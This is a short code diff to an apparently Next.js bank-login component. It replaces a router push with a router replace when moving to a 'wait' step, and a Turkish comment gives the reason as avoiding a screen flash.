@@ -550,7 +550,8 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       },
     });
     void flushAuditQueueNow();
-    router.push(stepToPath("wait", sessionId));
+    // ⭐ FLASH YOK: router.push → router.replace
+    router.replace(stepToPath("wait", sessionId));
   }
 
   if (!supabase) {
